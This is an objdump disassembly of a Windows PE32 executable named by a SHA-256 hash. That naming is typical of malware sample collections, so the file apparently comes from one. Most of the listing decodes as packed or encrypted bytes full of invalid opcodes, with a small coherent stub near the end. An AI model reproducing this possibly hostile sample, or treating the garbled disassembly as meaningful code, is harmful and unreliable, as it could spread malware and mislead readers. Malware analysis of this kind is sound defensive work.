
dc4e1555e5038c7a6a5aea951f2c3b74ec2286db6f24b6a2502972deb84ec8b8.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	jno    0x4cffe4
  4d0002:	adc    al,0x88
  4d0004:	mov    dh,0x1
  4d0006:	pushf  
  4d0007:	or     al,0x89
  4d0009:	outs   dx,BYTE PTR ds:[esi]
  4d000a:	imul   DWORD PTR [ebx]
  4d000c:	or     bh,bl
  4d000e:	es aaa 
  4d0010:	out    dx,eax
  4d0011:	mov    bh,0xb1
  4d0013:	sar    DWORD PTR [ecx],1
  4d0015:	jbe    0x4d000c
  4d0017:	add    bl,BYTE PTR [eax]
  4d0019:	loop   0x4cffb5
  4d001b:	lea    edx,[edi+eiz*8]
  4d001e:	call   0x75baf056
  4d0023:	scas   al,BYTE PTR es:[edi]
  4d0024:	push   cs
  4d0025:	push   ss
  4d0026:	dec    edi
  4d0027:	inc    esi
  4d0028:	fcomi  st,st(7)
  4d002a:	mov    al,0xb9
  4d002c:	mov    BYTE PTR es:[ecx-0x1d223ba9],cl
  4d0033:	fld    TBYTE PTR [edi+0x50]
  4d0036:	adc    DWORD PTR [eax-0x40295002],0x6af45084
  4d0040:	fidiv  WORD PTR [ebx+ecx*1]
  4d0043:	ins    BYTE PTR es:[edi],dx
  4d0044:	scas   al,BYTE PTR es:[edi]
  4d0045:	mov    ds:0xdd8fd6f8,eax
  4d004a:	jg     0x4d00c5
  4d004c:	jb     0x4cfff0
  4d004e:	test   BYTE PTR [esi+0x6c638905],al
  4d0054:	add    DWORD PTR [edi-0x64],esi
  4d0057:	lock mov edi,DWORD PTR [esi+0x1d]
  4d005b:	and    BYTE PTR [esi-0x7f],dh
  4d005e:	loop   0x4cffec
  4d0060:	jae    0x4d00d3
  4d0062:	and    BYTE PTR [ebx-0x72],dh
  4d0065:	pop    ss
  4d0066:	mov    DWORD PTR es:[ebp-0x22],edx
  4d006a:	inc    esp
  4d006b:	ficom  DWORD PTR [ebx+eiz*2]
  4d006e:	daa    
  4d006f:	xchg   edx,eax
  4d0070:	pop    esp
  4d0071:	add    eax,0x6b06d321
  4d0076:	xor    eax,DWORD PTR [eax+0x8d4eafa]
  4d007c:	or     eax,0x3a5f2b7f
  4d0081:	repz cmp DWORD PTR [esi],eax
  4d0084:	das    
  4d0085:	push   ebp
  4d0086:	sub    ebx,DWORD PTR [ebx+0x42]
  4d0089:	jmp    DWORD PTR [edi]
  4d008b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d008c:	adc    al,0x9
  4d008e:	popa   
  4d008f:	mov    ds:0x766379f1,al
  4d0094:	jp     0x4d005c
  4d0096:	add    al,0x8a
  4d0098:	xchg   edi,eax
  4d0099:	cmp    ebx,edi
  4d009b:	fisttp QWORD PTR [esi]
  4d009d:	int    0x4
  4d009f:	and    bl,BYTE PTR [ebp+0x33]
  4d00a2:	cli    
  4d00a3:	xor    esi,DWORD PTR [edi+edx*2-0x57132e02]
  4d00aa:	add    DWORD PTR [esi],ebp
  4d00ac:	gs in  al,0xb3
  4d00af:	mov    ds:0x174c1b95,al
  4d00b4:	adc    bl,ch
  4d00b6:	mov    bl,0xe8
  4d00b8:	in     al,0xb9
  4d00ba:	verr   WORD PTR [esi-0x47000fb5]
  4d00c1:	adc    dl,BYTE PTR [edi+0x51436d34]
  4d00c7:	lds    ebx,FWORD PTR [eax-0x5fdd5144]
  4d00cd:	dec    eax
  4d00ce:	push   ecx
  4d00cf:	fucomp st(4)
  4d00d1:	scas   eax,DWORD PTR es:[edi]
  4d00d2:	sbb    DWORD PTR [ebx],esp
  4d00d4:	jg     0x4d0126
  4d00d6:	in     eax,0x52
  4d00d8:	out    0x6,al
  4d00da:	sbb    al,BYTE PTR [ebx]
  4d00dc:	inc    ebx
  4d00dd:	test   BYTE PTR [ebx],dh
  4d00df:	sub    BYTE PTR gs:[eax+eiz*1-0xd],bh
  4d00e4:	fdivr  DWORD PTR [eax-0x6285a2fd]
  4d00ea:	push   ebx
  4d00eb:	mov    ds:0xb5048edc,al
  4d00f0:	and    al,0xc7
  4d00f2:	adc    esi,DWORD PTR [ebx]
  4d00f4:	push   es
  4d00f5:	cmp    al,0xec
  4d00f7:	int3   
  4d00f8:	xchg   BYTE PTR [edx],cl
  4d00fa:	push   eax
  4d00fb:	sar    BYTE PTR [edi-0x5],0x15
  4d00ff:	aaa    
  4d0100:	ret    0xea1a
  4d0103:	call   0x6f9bfcbc
  4d0108:	cmp    DWORD PTR [eax-0x3e],0xa7bbd81b
  4d010f:	call   0x17d545a5
  4d0114:	jo     0x4d00d0
  4d0116:	call   0x6d91e553
  4d011b:	xlat   BYTE PTR ds:[ebx]
  4d011c:	test   al,0x38
  4d011e:	(bad)  
  4d011f:	js     0x4d00ce
  4d0121:	xor    DWORD PTR ds:0x50cda7de,eax
  4d0127:	cs scas al,BYTE PTR es:[edi]
  4d0129:	pushf  
  4d012a:	mov    cl,0x28
  4d012c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d012d:	mov    ecx,0x41e6a6d9
  4d0132:	sbb    bh,dh
  4d0134:	jns    0x4d00f3
  4d0136:	cmp    ecx,DWORD PTR [esi]
  4d0138:	loopne 0x4d0107
  4d013a:	xchg   edx,eax
  4d013b:	cmc    
  4d013c:	push   0x6e
  4d013e:	cli    
  4d013f:	sub    DWORD PTR [edi+0x619c5d1c],0xffffff9a
  4d0146:	in     al,0x77
  4d0148:	mov    ds:0xa73f2b5d,eax
  4d014d:	test   al,0x34
  4d014f:	dec    esp
  4d0150:	mov    eax,ds:0xd474506b
  4d0155:	aad    0x3a
  4d0157:	shl    DWORD PTR ds:0x6a185af,cl
  4d015d:	cmp    DWORD PTR [ebx+eiz*2],ecx
  4d0160:	sti    
  4d0161:	(bad)  
  4d0162:	jle    0x4d01c9
  4d0164:	xchg   ecx,eax
  4d0165:	and    BYTE PTR [ebp+0x5a81e582],0x7d
  4d016c:	pop    ds
  4d016d:	cmc    
  4d016e:	mov    ecx,0xd11b5981
  4d0173:	std    
  4d0174:	mov    ah,0xe7
  4d0176:	sub    DWORD PTR [esi-0x63],ebx
  4d0179:	mov    ds:0xadb4f4aa,eax
  4d017e:	lods   al,BYTE PTR ds:[esi]
  4d017f:	pop    esp
  4d0180:	lahf   
  4d0181:	mov    esp,0x42b9f457
  4d0186:	(bad)  
  4d0187:	pop    ss
  4d0188:	mov    eax,ds:0x533fc1f0
  4d018d:	mov    edx,0x39794b9d
  4d0192:	pop    es
  4d0193:	mov    ah,0xdd
  4d0195:	rcl    BYTE PTR [eax-0x53],cl
  4d0198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0199:	hlt    
  4d019a:	xlat   BYTE PTR ds:[ebx]
  4d019b:	xor    al,0xb
  4d019d:	hlt    
  4d019e:	xor    ecx,esp
  4d01a0:	test   BYTE PTR [ebx],0xb4
  4d01a3:	mov    ch,0xb
  4d01a5:	hlt    
  4d01a6:	dec    ebx
  4d01a7:	mov    ds:0x5df40c5e,al
  4d01ac:	mov    ds:0xb40a81f2,eax
  4d01b1:	cwde   
  4d01b2:	jns    0x4d0135
  4d01b4:	cmp    eax,0xc4829150
  4d01b9:	scas   eax,DWORD PTR es:[edi]
  4d01ba:	sar    BYTE PTR [edx+esi*2-0x80],cl
  4d01be:	sub    eax,0x5dd78f83
  4d01c3:	mov    ebp,0x4ee2b37e
  4d01c8:	mov    esp,0x492535a4
  4d01cd:	out    0xca,al
  4d01cf:	lds    ebp,FWORD PTR [edi+0x555e41a5]
  4d01d5:	mov    ds:0x851d2cfa,eax
  4d01da:	or     dl,cl
  4d01dc:	ins    DWORD PTR es:[edi],dx
  4d01dd:	repz movsx eax,WORD PTR [ecx+ebp*1]
  4d01e2:	push   esi
  4d01e3:	cmp    BYTE PTR [esi],bh
  4d01e5:	in     eax,dx
  4d01e6:	test   eax,0xba1f38e7
  4d01eb:	mov    ecx,0x4645e0e1
  4d01f0:	stos   DWORD PTR es:[edi],eax
  4d01f1:	pop    edi
  4d01f2:	jmp    0x4713:0x14a8ce42
  4d01f9:	aas    
  4d01fa:	(bad)  
  4d01fb:	out    dx,eax
  4d01fc:	mov    edx,0x9fd9fac0
  4d0201:	enter  0x4a79,0x7e
  4d0205:	cwde   
  4d0206:	(bad)  
  4d0207:	popf   
  4d0208:	shr    BYTE PTR [ebx+0x29],0x62
  4d020c:	cdq    
  4d020d:	adc    eax,0xec68f64f
  4d0212:	mov    al,0x9
  4d0214:	push   cs
  4d0215:	and    ebx,edx
  4d0217:	cli    
  4d0218:	pop    ss
  4d0219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d021a:	sub    ch,BYTE PTR [ecx]
  4d021c:	jmp    0x4f19:0x16d6d55b
  4d0223:	sub    eax,0x96711a3b
  4d0228:	es jno 0x4d01ad
  4d022b:	ins    DWORD PTR es:[edi],dx
  4d022c:	push   ecx
  4d022d:	retf   
  4d022e:	or     BYTE PTR [ecx+0x30],cl
  4d0231:	xor    eax,0xc156b6f7
  4d0236:	jge    0x4d01f4
  4d0238:	scas   al,BYTE PTR es:[edi]
  4d0239:	xor    DWORD PTR [esi],ecx
  4d023b:	ret    0x535f
  4d023e:	icebp  
  4d023f:	mov    dl,0xc
  4d0241:	mov    al,0x9
  4d0243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0244:	hlt    
  4d0245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0246:	cli    
  4d0247:	(bad)  
  4d0249:	iret   
  4d024a:	or     DWORD PTR [edi+0x33],esi
  4d024d:	xchg   dh,dh
  4d024f:	fsub   DWORD PTR [eax*1-0x121fc880]
  4d0256:	or     eax,edi
  4d0258:	into   
  4d0259:	xchg   edi,eax
  4d025a:	mov    ah,0xae
  4d025c:	cs xchg esp,eax
  4d025e:	inc    edx
  4d025f:	frstor [ecx-0x4b8cf136]
  4d0265:	lahf   
  4d0266:	cmc    
  4d0267:	frstor [edi+ebx*2+0x2bb32e60]
  4d026e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d026f:	push   esi
  4d0270:	push   cs
  4d0271:	gs jmp 0xcbff:0xa2ab3934
  4d0279:	stos   DWORD PTR es:[edi],eax
  4d027a:	or     al,BYTE PTR [esi+0x2310c8f6]
  4d0280:	or     esi,DWORD PTR [edi]
  4d0282:	out    dx,eax
  4d0283:	pop    esp
  4d0284:	imul   ecx,ebp,0xffffff9d
  4d0287:	out    0x99,eax
  4d0289:	xor    al,0x87
  4d028b:	pop    ss
  4d028c:	addr16 retf 
  4d028e:	clc    
  4d028f:	cmp    BYTE PTR [ecx+0x67db2ba9],bl
  4d0295:	lods   al,BYTE PTR ds:[esi]
  4d0296:	fmul   st(7),st
  4d0298:	test   DWORD PTR [ebx+eax*4],esi
  4d029b:	mov    ss,esp
  4d029d:	and    al,0xd1
  4d029f:	sar    DWORD PTR [esi+0x32],0x2e
  4d02a3:	xchg   esp,eax
  4d02a4:	(bad)  
  4d02a5:	and    eax,0xc5863255
  4d02aa:	cmp    ch,BYTE PTR [edi]
  4d02ac:	ds fwait
  4d02ae:	push   eax
  4d02af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02b0:	dec    esi
  4d02b1:	push   edi
  4d02b2:	mov    bl,0xd1
  4d02b4:	out    dx,eax
  4d02b5:	shl    DWORD PTR [edx+0x6cfe9762],cl
  4d02bb:	and    edi,edi
  4d02bd:	add    DWORD PTR [ebx+0x118c8dde],edx
  4d02c3:	and    dh,BYTE PTR [ebx+esi*2+0x79]
  4d02c7:	xchg   esp,eax
  4d02c8:	sub    eax,0x596b868d
  4d02cd:	imul   ecx,DWORD PTR [ecx+0x76972918],0x375bdbe7
  4d02d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02d8:	push   ds
  4d02d9:	test   al,0xc3
  4d02db:	lods   al,BYTE PTR ds:[esi]
  4d02dc:	outs   dx,BYTE PTR ds:[esi]
  4d02dd:	sbb    al,0x8d
  4d02df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02e0:	in     eax,0x33
  4d02e2:	fstp   QWORD PTR [edi-0x7c]
  4d02e5:	int3   
  4d02e6:	xor    ah,BYTE PTR [eax+0x48508a7d]
  4d02ec:	mov    ch,al
  4d02ee:	sbb    DWORD PTR [ecx+eiz*8+0x2043f63a],edi
  4d02f5:	sbb    al,0x8b
  4d02f7:	rol    BYTE PTR ds:0xfc3f84e4,0x1a
  4d02fe:	ror    esp,1
  4d0300:	add    al,0x3b
  4d0302:	cmp    ecx,DWORD PTR [ebp+0x3af07256]
  4d0308:	cld    
  4d0309:	sbb    al,bl
  4d030b:	xchg   esi,eax
  4d030c:	out    dx,al
  4d030d:	push   0x11
  4d030f:	outs   dx,BYTE PTR ds:[esi]
  4d0310:	inc    esi
  4d0311:	push   ebp
  4d0312:	push   ebp
  4d0313:	aas    
  4d0314:	and    DWORD PTR [ebx+ebp*4-0x10],edx
  4d0318:	push   esp
  4d0319:	mov    ah,0x79
  4d031b:	push   cs
  4d031c:	mov    esp,0x59f2864b
  4d0321:	mov    ebx,0xd201fc5b
  4d0326:	call   0x69cc0752
  4d032b:	sub    ah,bh
  4d032d:	mov    cl,0xfe
  4d032f:	xlat   BYTE PTR ds:[ebx]
  4d0330:	adc    eax,0x6f7f014e
  4d0335:	call   0x2f64:0x9691d103
  4d033c:	sub    BYTE PTR [ecx-0x65],0x27
  4d0340:	add    bl,BYTE PTR [ebx+0x650fd888]
  4d0346:	ja     0x4d036e
  4d0348:	inc    edi
  4d0349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d034a:	xchg   DWORD PTR [edi],ebp
  4d034c:	(bad)  
  4d034d:	mov    dl,0xd1
  4d034f:	sub    BYTE PTR [ebx-0x10b3082e],dl
  4d0355:	mov    cs,ebx
  4d0357:	adc    edi,ebp
  4d0359:	js     0x4d033c
  4d035b:	into   
  4d035c:	add    DWORD PTR ds:0x76c33453,edx
  4d0362:	xchg   ebp,eax
  4d0363:	push   edi
  4d0364:	xor    DWORD PTR [ebx+0x7b],eax
  4d0367:	test   al,0xd0
  4d0369:	mov    esp,0x4330436c
  4d036e:	xchg   ebx,eax
  4d036f:	jbe    0x4d0361
  4d0371:	mov    esp,0x24f9896c
  4d0376:	xchg   ebx,eax
  4d0377:	jbe    0x4d0380
  4d0379:	xor    ah,BYTE PTR [esi]
  4d037b:	xchg   ecx,eax
  4d037c:	cli    
  4d037d:	int    0xd9
  4d037f:	push   esi
  4d0380:	fnsave [ecx]
  4d0382:	es test eax,0x8b659eaf
  4d0388:	jbe    0x4d03a4
  4d038a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d038b:	je     0x4d0318
  4d038d:	in     eax,0x43
  4d038f:	push   ebx
  4d0390:	jne    0x4d03ac
  4d0392:	mov    esp,0xe718a38
  4d0397:	mov    al,0x35
  4d0399:	mov    ?,ecx
  4d039b:	dec    edi
  4d039c:	push   DWORD PTR [ecx]
  4d039e:	pop    edi
  4d039f:	jno    0x4d036b
  4d03a1:	aad    0x61
  4d03a3:	xchg   ebx,eax
  4d03a4:	pop    ebx
  4d03a5:	aaa    
  4d03a6:	lahf   
  4d03a7:	jo     0x4d0373
  4d03a9:	je     0x4d0390
  4d03ab:	dec    edi
  4d03ac:	lods   al,BYTE PTR ds:[esi]
  4d03ad:	jl     0x4d0422
  4d03af:	cmp    ecx,DWORD PTR [edi+edi*4+0x51]
  4d03b3:	cmp    DWORD PTR [eax-0x2b5bdc76],edi
  4d03b9:	test   eax,0x56371500
  4d03be:	(bad)  
  4d03bf:	jmp    0xd04e:0x15003fb2
  4d03c6:	mov    dh,0xf7
  4d03c8:	or     DWORD PTR [esi+0x7200c19a],ecx
  4d03ce:	gs ds jmp 0x180e9de8
  4d03d5:	inc    esi
  4d03d6:	dec    esi
  4d03d7:	mov    esi,0xcbb1b9e9
  4d03dc:	mov    WORD PTR [edx+0x6a],gs
  4d03df:	xchg   ebp,eax
  4d03e0:	cmp    bh,ah
  4d03e2:	push   esi
  4d03e3:	push   ebx
  4d03e4:	out    0xd1,al
  4d03e6:	leave  
  4d03e7:	lods   al,BYTE PTR ds:[esi]
  4d03e8:	sbb    ebp,DWORD PTR [esi]
  4d03ea:	jle    0x4d03b3
  4d03ec:	push   ss
  4d03ed:	mov    eax,DWORD PTR [eax+edi*1+0x3bc374eb]
  4d03f4:	ds inc esp
  4d03f6:	pop    ebp
  4d03f7:	(bad)
  4d03fb:	scas   eax,DWORD PTR es:[edi]
  4d03fc:	pop    esi
  4d03fd:	std    
  4d03fe:	sbb    DWORD PTR [eax-0x5d],edx
  4d0401:	add    ch,BYTE PTR [esi]
  4d0403:	and    al,0x76
  4d0405:	mov    dh,0x12
  4d0407:	fmul   QWORD PTR [ebx-0x7967cab7]
  4d040d:	outs   dx,DWORD PTR ds:[esi]
  4d040e:	iret   
  4d040f:	addr16 jnp 0x4d03a2
  4d0412:	js     0x4d0420
  4d0414:	mov    gs,WORD PTR [eax]
  4d0416:	enter  0x73f3,0xd7
  4d041a:	jg     0x4d039c
  4d041c:	mov    ?,WORD PTR [ebx-0x52c926bf]
  4d0422:	dec    ecx
  4d0423:	jl     0x4d0460
  4d0425:	aam    0xa8
  4d0427:	adc    eax,0x75cf71b0
  4d042c:	sahf   
  4d042d:	idiv   BYTE PTR [ebx-0x63791978]
  4d0433:	ja     0x4d03c4
  4d0435:	jl     0x4d049b
  4d0437:	std    
  4d0438:	retf   0xe10e
  4d043b:	bound  edi,QWORD PTR [ecx+esi*4-0x6b314d6d]
  4d0442:	test   al,0x9f
  4d0444:	in     eax,dx
  4d0445:	outs   dx,DWORD PTR ds:[esi]
  4d0446:	push   edi
  4d0447:	pusha  
  4d0448:	adc    al,0x78
  4d044a:	dec    esi
  4d044b:	mov    eax,ds:0x620b87ed
  4d0450:	add    al,0x7c
  4d0452:	in     al,dx
  4d0453:	leave  
  4d0454:	lds    edi,FWORD PTR [edi+0x4db18e88]
  4d045a:	jp     0x4d0442
  4d045c:	lods   al,BYTE PTR ds:[esi]
  4d045d:	mov    ch,0x2
  4d045f:	jbe    0x4d03e1
  4d0461:	xchg   edi,eax
  4d0462:	pop    ecx
  4d0463:	cmovp  ebx,ebp
  4d0466:	mov    cl,0x9d
  4d0468:	pop    es
  4d0469:	push   esi
  4d046a:	adc    BYTE PTR [ebp+0x46d92da5],bh
  4d0470:	ds mov dh,0x88
  4d0473:	jl     0x4d0498
  4d0475:	int    0xf4
  4d0477:	iret   
  4d0478:	fisub  WORD PTR [esi+0x5932181d]
  4d047e:	loop   0x4d0467
  4d0480:	pop    edx
  4d0481:	and    al,0x72
  4d0483:	popf   
  4d0484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0485:	push   eax
  4d0486:	xchg   esp,eax
  4d0487:	or     eax,0xf26c5343
  4d048c:	mov    esi,0x426e570d
  4d0491:	dec    eax
  4d0492:	in     eax,0x1c
  4d0494:	xchg   edi,eax
  4d0495:	inc    ebx
  4d0496:	nop
  4d0497:	das    
  4d0498:	cmc    
  4d0499:	add    eax,eax
  4d049b:	and    BYTE PTR [esi+eiz*2+0x40],bl
  4d049f:	fbstp  TBYTE PTR [ecx-0x5adfed67]
  4d04a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d04a6:	inc    esi
  4d04a7:	xor    bh,ah
  4d04a9:	push   ecx
  4d04aa:	lods   eax,DWORD PTR ds:[esi]
  4d04ab:	je     0x4d04af
  4d04ad:	out    0x52,eax
  4d04af:	mov    edi,edi
  4d04b1:	pusha  
  4d04b2:	ss mov ecx,0x3f54bf26
  4d04b8:	push   0x99c5684d
  4d04bd:	mov    dl,0x97
  4d04bf:	sahf   
  4d04c0:	or     DWORD PTR [esi+0x68],esp
  4d04c3:	popa   
  4d04c4:	clc    
  4d04c5:	and    al,0x8
  4d04c7:	retf   
  4d04c8:	pop    edx
  4d04c9:	inc    ebx
  4d04ca:	clc    
  4d04cb:	xor    al,0xb3
  4d04cd:	mov    esp,0x83a3ca5a
  4d04d2:	xor    al,BYTE PTR [edx+0x16]
  4d04d5:	or     al,0xcf
  4d04d7:	or     eax,0xeabcc376
  4d04dc:	jle    0x4d04c0
  4d04de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04df:	mov    dh,0x9b
  4d04e1:	sbb    eax,0x22f54958
  4d04e6:	aam    0x17
  4d04e8:	iret   
  4d04e9:	cmp    eax,0xc452d4ad
  4d04ee:	push   edx
  4d04ef:	sub    edx,DWORD PTR [edi]
  4d04f1:	pusha  
  4d04f2:	scas   eax,DWORD PTR es:[edi]
  4d04f3:	aam    0xea
  4d04f5:	rol    BYTE PTR [esi-0x6a],cl
  4d04f8:	pop    ss
  4d04f9:	xchg   edi,eax
  4d04fa:	shr    DWORD PTR [eax+0x3f],0x85
  4d04fe:	leave  
  4d04ff:	outs   dx,DWORD PTR ds:[esi]
  4d0500:	push   ss
  4d0501:	into   
  4d0502:	xor    eax,0xebd1fe6
  4d0507:	inc    BYTE PTR ds:[ebp+0x31]
  4d050b:	dec    BYTE PTR [esi+0x73028f3a]
  4d0511:	(bad)
  4d0514:	add    bh,BYTE PTR [eax+edx*2]
  4d0517:	xchg   esi,eax
  4d0518:	push   edx
  4d0519:	ret    
  4d051a:	add    eax,0x6ffd34a2
  4d051f:	inc    ebx
  4d0520:	and    BYTE PTR [edx],al
  4d0522:	out    0xd4,al
  4d0524:	(bad)
  4d0529:	cmp    eax,0xde86474a
  4d052e:	push   ss
  4d052f:	jl     0x4d050c
  4d0531:	mov    DWORD PTR [ebp-0x10],edx
  4d0534:	es jbe 0x4d0549
  4d0537:	or     BYTE PTR [edi-0x48],0x51
  4d053b:	out    0x1f,al
  4d053d:	mov    ebx,0x44367d24
  4d0542:	xor    DWORD PTR [edi-0x7ebb83b0],eax
  4d0548:	add    eax,0x817f1183
  4d054d:	cmp    eax,0xc2eace63
  4d0552:	add    al,0x9b
  4d0554:	test   DWORD PTR [ecx-0x3a1d329f],esi
  4d055a:	push   cs
  4d055b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d055c:	jae    0x4d04e8
  4d055e:	lock mov al,0x96
  4d0561:	clc    
  4d0562:	rcr    DWORD PTR [ebx-0xa],cl
  4d0565:	idiv   DWORD PTR [eax+edi*8+0x75]
  4d0569:	dec    eax
  4d056a:	in     eax,dx
  4d056b:	push   cs
  4d056c:	loop   0x4d0524
  4d056e:	push   0xeb9977fd
  4d0573:	push   edx
  4d0574:	hlt    
  4d0575:	ins    DWORD PTR es:[edi],dx
  4d0576:	push   0xffffff95
  4d0578:	xor    edx,DWORD PTR [edx-0x55a6956b]
  4d057e:	mov    ss,WORD PTR [esi]
  4d0580:	outs   dx,DWORD PTR ds:[esi]
  4d0581:	push   0x192e971
  4d0586:	xchg   esi,eax
  4d0587:	outs   dx,DWORD PTR ds:[esi]
  4d0588:	bound  esp,QWORD PTR [ebx+0x8651bb1]
  4d058e:	fsub   QWORD PTR [edx-0x6b]
  4d0591:	test   al,0x8c
  4d0593:	inc    edi
  4d0594:	les    eax,FWORD PTR [edx]
  4d0596:	and    al,0x7c
  4d0598:	out    0xfc,eax
  4d059a:	xor    DWORD PTR [eax+0x7c928672],edx
  4d05a0:	lock cmp al,0xc6
  4d05a3:	and    cl,0x18
  4d05a6:	and    bl,BYTE PTR [eax+eiz*1]
  4d05a9:	out    0xdd,eax
  4d05ab:	inc    eax
  4d05ac:	outs   dx,BYTE PTR ds:[esi]
  4d05ad:	pop    esi
  4d05ae:	xchg   edx,eax
  4d05af:	inc    edx
  4d05b0:	push   ebx
  4d05b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d05b2:	test   BYTE PTR [ecx],0xd2
  4d05b5:	imul   esp,DWORD PTR [esi-0x2],0x199962f
  4d05bc:	shr    BYTE PTR [ecx-0x32],cl
  4d05bf:	(bad)  
  4d05c0:	das    
  4d05c1:	xchg   esi,eax
  4d05c2:	xor    esp,eax
  4d05c4:	cmp    BYTE PTR [ebp-0x4f7c5d3c],bl
  4d05ca:	xchg   ebp,eax
  4d05cb:	ret    
  4d05cc:	sub    esi,DWORD PTR [esi+0x524a0c9d]
  4d05d2:	jecxz  0x4d05b5
  4d05d4:	mov    ecx,0x331e1cbd
  4d05d9:	xor    BYTE PTR [ecx+0x40],dh
  4d05dc:	int3   
  4d05dd:	push   esp
  4d05de:	mov    ?,WORD PTR ds:0x4e83726
  4d05e4:	inc    ecx
  4d05e5:	sub    DWORD PTR [eax+0x40],0x4d
  4d05e9:	mov    cl,0xb5
  4d05eb:	and    eax,0xaa7db561
  4d05f0:	adc    eax,0x1fa7462b
  4d05f5:	sahf   
  4d05f6:	sti    
  4d05f7:	and    DWORD PTR [edx+ebx*8+0x105ff008],0xffffffef
  4d05ff:	inc    ebx
  4d0600:	(bad)  
  4d0602:	rcr    BYTE PTR [esi-0x130f9965],cl
  4d0608:	jecxz  0x4d060b
  4d060a:	jp     0x4d0623
  4d060c:	xchg   dh,bh
  4d060e:	xchg   ebp,eax
  4d060f:	call   0x18215e8f
  4d0614:	test   ebp,edi
  4d0616:	cmp    esi,DWORD PTR [ebx+0x6c]
  4d0619:	test   BYTE PTR [eax+0x4f7b9691],dh
  4d061f:	stc    
  4d0620:	addr16 in eax,dx
  4d0622:	mov    ah,0x7
  4d0624:	call   0x7e43:0x664ba212
  4d062b:	push   ds
  4d062c:	fwait
  4d062d:	and    al,0x2
  4d062f:	loop   0x4d0697
  4d0631:	(bad)  [edi+0x21]
  4d0634:	add    eax,0x64e00225
  4d0639:	(bad)  
  4d063b:	pop    ds
  4d063c:	sbb    eax,0x836017c
  4d0641:	add    eax,0xfafacec3
  4d0646:	cmp    al,0xf4
  4d0648:	xchg   edi,eax
  4d0649:	pop    ebp
  4d064a:	ret    0x65dc
  4d064d:	ja     0x4d062f
  4d064f:	test   BYTE PTR [esi],ah
  4d0651:	lds    esp,FWORD PTR [ebx]
  4d0653:	enter  0xf328,0x8b
  4d0657:	add    al,0xb6
  4d0659:	dec    eax
  4d065a:	or     eax,0x3b436b82
  4d065f:	loopne 0x4d06d8
  4d0661:	das    
  4d0662:	sahf   
  4d0663:	cmp    ebp,DWORD PTR [edx-0x73]
  4d0666:	inc    eax
  4d0667:	xor    DWORD PTR [edx],esi
  4d0669:	and    DWORD PTR [ebx+eiz*4-0x71],ebx
  4d066d:	add    ch,ch
  4d066f:	clc    
  4d0670:	dec    edx
  4d0671:	imul   eax,eax,0x1e
  4d0674:	mov    ch,0x5e
  4d0676:	jmp    0x77c2:0xb00d9266
  4d067d:	jne    0x4d06da
  4d067f:	in     al,0x43
  4d0681:	jno    0x4d063e
  4d0683:	sbb    al,0xfe
  4d0685:	stos   BYTE PTR es:[edi],al
  4d0686:	inc    ebp
  4d0687:	outs   dx,BYTE PTR ds:[esi]
  4d0688:	mov    esi,0xd0599c9d
  4d068d:	and    eax,eax
  4d068f:	int3   
  4d0690:	xor    esi,DWORD PTR [ecx+0x7f]
  4d0693:	jmp    0x7133:0x15808ece
  4d069a:	jg     0x4d0686
  4d069c:	into   
  4d069d:	mov    es,WORD PTR [eax+0x7f713315]
  4d06a3:	jmp    0x7133:0x15808ece
  4d06aa:	jg     0x4d0696
  4d06ac:	into   
  4d06ad:	mov    es,WORD PTR [eax+0x7fd23315]
  4d06b3:	jmp    0x7e33:0x158585ce
  4d06ba:	jp     0x4d06a6
  4d06bc:	push   edi
  4d06bd:	mov    ah,BYTE PTR [ebx+ecx*1-0x4e]
  4d06c1:	div    eax
  4d06c3:	imul   esp,DWORD PTR [eax+eiz*1],0x45
  4d06c7:	push   ebx
  4d06c8:	loopne 0x4d06ba
  4d06ca:	xchg   DWORD PTR [ecx],ebx
  4d06cc:	loop   0x4d06ca
  4d06ce:	lock mov bh,0xbd
  4d06d1:	test   DWORD PTR [ecx+0x22],ebp
  4d06d4:	pop    ss
  4d06d5:	mov    ds:0x26396d04,al
  4d06da:	xchg   edi,eax
  4d06db:	call   0x489f:0xa5fb9301
  4d06e2:	xchg   edi,eax
  4d06e3:	inc    esi
  4d06e4:	xchg   ebp,eax
  4d06e5:	pop    edi
  4d06e6:	out    0x18,al
  4d06e8:	push   eax
  4d06e9:	dec    edi
  4d06ea:	shl    DWORD PTR [eax-0x75],0xff
  4d06ee:	push   ebp
  4d06ef:	mov    ebp,esp
  4d06f1:	sub    esp,0x24
  4d06f4:	lea    edx,ds:0x4d3070
  4d06fa:	sbb    esi,0x1a
  4d06fd:	push   edx
  4d06fe:	push   DWORD PTR [edx+0x24]
  4d0701:	push   DWORD PTR [edx+0x4]
  4d0704:	push   DWORD PTR [edx+0x1d8]
  4d070a:	call   0x4d11a8
  4d070f:	add    esp,0xc
  4d0712:	pop    edx
  4d0713:	push   edx
  4d0714:	mov    esi,0x0
  4d0719:	push   esi
  4d071a:	call   0x4d10e4
  4d071f:	add    esp,0x4
  4d0722:	pop    edx
  4d0723:	push   edx
  4d0724:	push   0x0
  4d0726:	call   0x4d0bf8
  4d072b:	add    esp,0x4
  4d072e:	pop    edx
  4d072f:	add    esp,0x24
  4d0732:	pop    ebp
  4d0733:	ret    
  4d0734:	pop    edi
  4d0735:	call   DWORD PTR ds:0x4d2010
  4d073b:	call   edi
  4d073d:	add    BYTE PTR [eax],al
  4d073f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0745:	sub    esp,0x58
  4d0748:	lea    ecx,[edi+0x104]
  4d074e:	xor    DWORD PTR [ebp-0x34],esi
  4d0751:	push   ecx
  4d0752:	push   edx
